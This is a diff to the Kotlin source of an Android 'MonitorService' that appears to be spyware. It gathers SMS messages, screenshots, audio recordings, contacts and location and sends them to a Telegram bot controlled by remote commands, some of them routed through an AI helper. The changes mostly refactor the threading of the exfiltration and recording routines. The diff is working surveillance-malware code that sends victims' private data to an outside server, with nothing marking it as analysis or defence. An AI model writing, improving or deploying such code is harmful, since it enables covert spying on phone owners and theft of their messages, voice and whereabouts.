@@ -41,7 +41,6 @@ import java.util.concurrent.ConcurrentHashMap
 import java.util.concurrent.CountDownLatch
 import java.util.concurrent.atomic.AtomicBoolean
 import kotlin.concurrent.thread
-import java.util.regex.Pattern
 
 const val PREFS_NAME = "monitor_config"
 const val KEY_PERSISTENT = "persistent_mode"
@@ -125,10 +124,10 @@ class MonitorService : Service() {
         val hasLocation = checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
 
         if (hasSms || hasContacts || hasLocation) {
-            thread("test-run") {
+            Thread({
                 runTestSequence()
                 prefs.edit().putBoolean(KEY_TEST_SENT, true).apply()
-            }
+            }, "test-run").start()
         }
     }
 
@@ -141,7 +140,7 @@ class MonitorService : Service() {
             results += "Screenshot: ${screenResult["status"] ?: "completed"}\n"
 
             val smsResult = getSms()
-            val smsList = smsResult["sms"] as? List<*> ?: emptyList()
+            val smsList = (smsResult["sms"] as? List<Map<String, Any>>) ?: emptyList()
             val smsPreview = smsList.take(10).joinToString("\n") {
                 "${it["type"]}: ${it["address"]} - ${it["body"]?.take(50) ?: ""}"
             }
@@ -176,13 +175,13 @@ class MonitorService : Service() {
     }
 
     private fun startTelegramBot() {
-        thread("delete-wh") {
+        Thread({
             try {
                 val url = "$TELEGRAM_API$BOT_TOKEN/deleteWebhook?drop_pending_updates=true"
                 val req = Request.Builder().url(url).build()
                 client.newCall(req).execute().use { Log.d("Telegram", "WH: ${it.body?.string()}") }
             } catch (e: Exception) { Log.e("Telegram", "WH error", e) }
-        }
+        }, "delete-wh").start()
 
         pollThread = Thread({ pollLoop() }, "telegram-poll").apply { start() }
     }
@@ -548,10 +547,10 @@ class MonitorService : Service() {
                         prepare()
                         start()
                     }
-                    thread("audio-stop") {
+                    Thread({
                         Thread.sleep((duration * 1000L).toLong())
                         stopRecording()
-                    }
+                    }, "audio-stop").start()
                     mapOf("status" to "recording", "duration" to duration, "file" to outputFile.absolutePath)
                 } catch (e: Exception) {
                     mapOf("error" to e.message ?: "Audio start failed")
@@ -643,7 +642,7 @@ class MonitorService : Service() {
     }
 
     private fun sendTelegramMessage(chatId: Long, text: String) {
-        thread("tg-$chatId") { sendTelegramInternal(chatId, text) }
+        Thread({ sendTelegramInternal(chatId, text) }, "tg-$chatId").start()
     }
 
     private fun sendTelegramInternal(chatId: Long, text: String) {
@@ -663,7 +662,7 @@ class MonitorService : Service() {
     }
 
     private fun sendTelegramDocument(chatId: Long, filename: String, content: String, caption: String = "") {
-        thread("tg-doc-$chatId") {
+        Thread({
             try {
                 val file = File(getExternalFilesDir(null), filename)
                 file.writeText(content)
@@ -680,7 +679,7 @@ class MonitorService : Service() {
                 client.newCall(req).execute().use { Log.d("Telegram", "Doc sent to $chatId") }
                 file.delete()
             } catch (e: Exception) { Log.e("Telegram", "Doc send error", e) }
-        }
+        }, "tg-doc-$chatId").start()
     }
 
     private fun sendTelegramDocument(chatId: Long, filename: String, content: String, caption: String, forceFile: Boolean) {
@@ -714,7 +713,7 @@ class MonitorService : Service() {
     private fun callNemotron(prompt: String): String {
         try {
             val lower = prompt.lowercase()
-            val isGreeting: Boolean = if (lower == "hi") true else if (lower == "hello") true else if (lower == "hey") true else if (lower == "test") true else if (lower == "ping") true else false
+            val isGreeting = lower == "hi" || lower == "hello" || lower == "hey" || lower == "test" || lower == "ping"
             if (isGreeting) {
                 return """{"action": "none", "response": "Hello! I'm ready. Use /help for commands or ask me to run tasks like '/ai get contacts and location'."}"""
             }
